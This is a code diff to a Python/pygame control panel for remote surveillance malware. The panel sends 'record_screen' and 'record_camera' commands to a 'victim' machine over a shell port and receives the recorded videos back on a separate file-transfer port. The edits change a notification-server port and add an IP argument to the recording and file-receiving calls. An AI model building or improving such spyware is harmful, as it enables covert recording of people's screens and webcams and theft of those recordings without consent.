@@ -152,7 +152,7 @@ class HostNotificationHandler(BaseHTTPRequestHandler):
 
 
 def start_notification_server():
-    server = HTTPServer(('0.0.0.0', 8080), HostNotificationHandler)
+    server = HTTPServer(('0.0.0.0', 8082), HostNotificationHandler)
     server.serve_forever()
 
 
@@ -295,7 +295,7 @@ def draw_static_frame(surface, frame_rect, border_color=(0, 0, 0), border_width=
     pygame.draw.rect(surface, border_color, frame_rect, border_width)
 
 
-def send_record_command_async(host, port, command, save_path, button, recording_type):
+def send_record_command_async(host, ip, port, command, save_path, button, recording_type):
     """Send recording command to victim and receive recorded file asynchronously"""
     def record_task():
         try:
@@ -319,6 +319,7 @@ def send_record_command_async(host, port, command, save_path, button, recording_
                         future = thread_pool.submit(
                             receive_file,
                             "0.0.0.0",
+                            ip,
                             port + 3,  # File transfer port
                             save_dir
                         )
@@ -452,7 +453,7 @@ def show_full_screen(display, options):
                                     video_filename = f"screen_record_{timestamp}.avi"
                                     video_path = os.path.join(victim_dir, 'videos', 'screen', video_filename)
                                     command = f"record_screen 60 {video_filename}"
-                                    send_record_command_async(host, shell_port, command, video_path, record_screen_button, 'screen')
+                                    send_record_command_async(host, display.text, shell_port, command, video_path, record_screen_button, 'screen')
                                     
                             elif recording and recording_type == 'screen':
                                 record_screen_button.text = "Record Screen"
@@ -471,7 +472,7 @@ def show_full_screen(display, options):
                                     video_filename = f"camera_record_{timestamp}.avi"
                                     video_path = os.path.join(victim_dir, 'videos', 'camera', video_filename)
                                     command = f"record_camera 60 {video_filename}"
-                                    send_record_command_async(host, shell_port, command, video_path, record_camera_button, 'camera')
+                                    send_record_command_async(host, display.text , shell_port, command, video_path, record_camera_button, 'camera')
                                     
                             elif recording and recording_type == 'camera':
                                 record_camera_button.text = "Record Camera"
@@ -486,6 +487,7 @@ def show_full_screen(display, options):
                                 future = thread_pool.submit(
                                     receive_file, 
                                     "0.0.0.0", 
+                                    display.text,
                                     options.port + 3, 
                                     save_dir
                                 )
